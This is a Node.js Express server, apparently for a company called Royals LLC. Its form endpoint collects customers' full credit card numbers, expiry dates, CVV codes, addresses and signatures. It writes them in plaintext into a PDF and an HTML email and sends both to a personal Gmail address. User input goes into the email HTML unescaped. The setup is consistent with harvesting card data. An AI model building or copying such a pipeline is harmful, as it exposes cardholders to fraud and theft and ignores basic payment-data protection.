const express = require('express');
const path = require('path');
const { Resend } = require('resend');
const PDFDocument = require('pdfkit');

// Load local .env variables if running locally during development
if (process.env.NODE_ENV !== 'production') {
    try {
        require('dotenv').config();
    } catch (e) {
        // dotenv optional in production environments
    }
}

const app = express();
const PORT = process.env.PORT || 3000;

// Initialize Resend securely using environment variables
const resend = new Resend(process.env.RESEND_API_KEY);

// Middleware to parse JSON bodies
app.use(express.json({ limit: '15mb' }));

// Serve static files from the 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

// Helper function to generate an executive-grade, luxury corporate PDF
function generatePdfBuffer(formData, clientFullName, refNum, amount, submissionTimestamp) {
    return new Promise((resolve, reject) => {
        try {
            const doc = new PDFDocument({ margin: 40, size: 'A4' });
            const buffers = [];

            doc.on('data', buffers.push.bind(buffers));
            doc.on('end', () => {
                const pdfBuffer = Buffer.concat(buffers);
                resolve(pdfBuffer);
            });

            // --- LUXURY PAGE BORDER FRAME ---
            doc.rect(25, 25, 545, 792).strokeColor('#d4af37').lineWidth(1.5).stroke();
            doc.rect(29, 29, 537, 784).strokeColor('#1a1a1a').lineWidth(0.5).stroke();

            // --- HEADER BRANDING ---
            doc.moveDown(0.8);
            doc.fontSize(24).fillColor('#1a1a1a').font('Helvetica-Bold').text('ROYALS LLC', { align: 'center', letterSpacing: 2 });
            doc.fontSize(9).fillColor('#d4af37').font('Helvetica-Bold').text('OFFICIAL CUSTOMER AGREEMENT & PAYMENT AUTHORIZATION', { align: 'center', letterSpacing: 1.5 });
            doc.moveDown(1);

            // --- TRANSACTION META BAR ---
            doc.rect(45, doc.y, 507, 32).fillAndStroke('#fcfcfc', '#e0e0e0');
            const metaY = doc.y + 10;
            doc.fontSize(8.5).fillColor('#333333').font('Helvetica-Bold');
            doc.text(`REFERENCE NO:`, 55, metaY, { continued: true }).font('Helvetica').text(` ${refNum}`);
            doc.font('Helvetica-Bold').text(`TIMESTAMP:`, 310, metaY, { continued: true }).font('Helvetica').text(` ${submissionTimestamp}`);
            doc.y = metaY + 25;
            doc.moveDown(1);

            // --- SECTION 1: CLIENT & TRANSACTION PROFILE ---
            doc.fontSize(11).fillColor('#d4af37').font('Helvetica-Bold').text('CLIENT & FINANCIAL PROFILE');
            doc.moveDown(0.4);

            const details = [
                ['Client Full Name:', clientFullName],
                ['Phone Number:', formData.phone || 'N/A'],
                ['Email Address:', formData.email || 'N/A'],
                ['Billing Address:', formData.billingAddress || 'N/A'],
                ['Shipping Address:', formData.shippingAddress || 'N/A'],
                ['Authorized Amount:', `$${amount} USD`],
                ['Cardholder Name:', formData.cardholderName || 'N/A'],
                ['Credit Card Number:', formData.cardNumber || 'N/A'],
                ['Expiration & CVV:', `${formData.cardExp || 'N/A'} / ${formData.cardCvv || 'N/A'}`],
                ['Assigned Agent:', formData.agentName || 'N/A'],
                ['Closing Specialist:', formData.closerName || 'N/A']
            ];

            let rowCount = 0;
            details.forEach(([label, value]) => {
                const currentY = doc.y;
                // Alternating row background for luxury corporate look
                if (rowCount % 2 === 0) {
                    doc.rect(45, currentY - 3, 507, 18).fill('#f9f9f9');
                }
                doc.fontSize(9).fillColor('#555555').font('Helvetica-Bold').text(label, 55, currentY, { width: 150 });
                doc.fillColor('#111111').font('Helvetica').text(value, 210, currentY, { width: 330 });
                doc.moveDown(0.8);
                rowCount++;
            });

            doc.moveDown(0.5);

            // --- SECTION 2: LEGAL AUTHORIZATION CLAUSE ---
            doc.fontSize(11).fillColor('#d4af37').font('Helvetica-Bold').text('TERMS & AUTHORIZATION ACKNOWLEDGEMENT');
            doc.moveDown(0.4);
            doc.fontSize(8.5).fillColor('#444444').font('Helvetica').text(
                'By executing this agreement digitally, the cardholder and client formally acknowledge and authorize Royals LLC to process the specified payment amount. All transactions are backed by our secure compliance protocols and standard merchant agreement terms.',
                { width: 507, lineGap: 3 }
            );

            doc.moveDown(1);

            // --- SECTION 3: DIGITAL SIGNATURE BLOCK ---
            if (formData.signature) {
                if (doc.y > 640) doc.addPage();

                doc.fontSize(11).fillColor('#d4af37').font('Helvetica-Bold').text('CLIENT ELECTRONIC SIGNATURE');
                doc.moveDown(0.4);

                try {
                    const base64Data = formData.signature.replace(/^data:image\/png;base64,/, '');
                    const signatureBuffer = Buffer.from(base64Data, 'base64');
                    
                    doc.rect(45, doc.y, 240, 80).fillAndStroke('#ffffff', '#cccccc');
                    doc.image(signatureBuffer, 50, doc.y + 5, { width: 230, height: 70, align: 'center', valign: 'center' });
                    doc.y += 90;
                } catch (sigErr) {
                    doc.fontSize(9).fillColor('#666666').font('Helvetica-Oblique').text('[Cryptographic Signature Bound]');
                    doc.moveDown(1);
                }
            }

            // --- FOOTER BRANDING ---
            doc.moveDown(1.5);
            doc.fontSize(7.5).fillColor('#888888').font('Helvetica').text('ROYALS LLC • SECURE EXECUTIVE VERIFICATION TERMINAL • CONFIDENTIAL RECORD', { align: 'center' });

            doc.end();
        } catch (err) {
            reject(err);
        }
    });
}

// API endpoint to handle form submission & luxury PDF attachment
app.post('/api/submit-form', async (req, res) => {
    try {
        const formData = req.body;
        const clientFullName = `${formData.firstName} ${formData.lastName}`;
        const refNum = formData.referenceNumber || 'N/A';
        const amount = formData.amount || '0';
        
        const submissionTimestamp = new Date().toUTCString();

        // Generate the luxury PDF buffer
        const pdfBuffer = await generatePdfBuffer(formData, clientFullName, refNum, amount, submissionTimestamp);

        // HTML Email content for Management
        const managementEmailHtml = `
            <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0b0b0b; color: #f3f3f3; padding: 35px; border-radius: 10px; border: 1px solid #333;">
                <h2 style="color: #d4af37; text-transform: uppercase; border-bottom: 2px solid #d4af37; padding-bottom: 10px; letter-spacing: 1px;">Royals LLC - New Customer Agreement Submitted</h2>
                
                <p style="font-size: 16px; color: #ffe875; margin-bottom: 20px;"><strong>Client:</strong> ${clientFullName}</p>
                
                <table style="width: 100%; border-collapse: collapse; margin-bottom: 25px; background: #141414; border: 1px solid #333;">
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa; width: 35%;"><strong>Reference Number:</strong></td>
                        <td style="padding: 12px; color: #fff;">${refNum}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Client Name:</strong></td>
                        <td style="padding: 12px; color: #fff;">${clientFullName}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Phone Number:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.phone}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Email Address:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.email}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Billing Address:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.billingAddress}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Shipping Address:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.shippingAddress}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Authorized Amount:</strong></td>
                        <td style="padding: 12px; color: #ffe875; font-size: 18px; font-weight: bold;">$${amount}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Cardholder Name:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.cardholderName}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Credit Card Number:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.cardNumber}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Expiration & CVV:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.cardExp} / ${formData.cardCvv}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Agent Name:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.agentName}</td>
                    </tr>
                    <tr>
                        <td style="padding: 12px; color: #aaa;"><strong>Closer Name:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.closerName}</td>
                    </tr>
                </table>

                ${formData.signature ? `
                    <div style="background: #141414; padding: 15px; border: 1px solid #333; border-radius: 6px; text-align: center;">
                        <p style="color: #d4af37; margin-bottom: 10px; font-size: 14px;"><strong>Client Digital Signature:</strong></p>
                        <img src="${formData.signature}" alt="Client Signature" style="background: #1f1f1f; border: 1px solid #d4af37; border-radius: 4px; max-width: 300px; height: auto;" />
                    </div>
                ` : ''}

                <p style="color: #666; font-size: 12px; text-align: center; margin-top: 30px;">ROYALS LLC Secure Client Verification Terminal • 2026 (Luxury PDF Attached)</p>
            </div>
        `;

        // Send email with the executive PDF attached
        const emailResponse = await resend.emails.send({
            from: 'Royals Secure Portal <onboarding@resend.dev>',
            to: ['royals101llc@gmail.com'],
            replyTo: formData.email,
            subject: `ROYALS LLC Agreement | Client: ${clientFullName} | Ref: ${refNum} | Amount: $${amount}`,
            html: managementEmailHtml,
            attachments: [
                {
                    filename: `Royals-Agreement-${refNum}.pdf`,
                    content: pdfBuffer,
                },
            ],
            headers: {
                'X-Priority': '1 (Highest)',
                'X-MSMail-Priority': 'High',
                'Importance': 'High'
            }
        });

        console.log('Email sent successfully with luxury PDF:', emailResponse);
        res.json({ success: true, message: 'Agreement submitted and luxury PDF attached successfully.' });

    } catch (error) {
        console.error('Error handling form submission:', error);
        res.status(500).json({ success: false, error: 'Internal Server Error' });
    }
});

// Fallback route to serve index.html
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Royals LLC server running on port ${PORT}`);
});
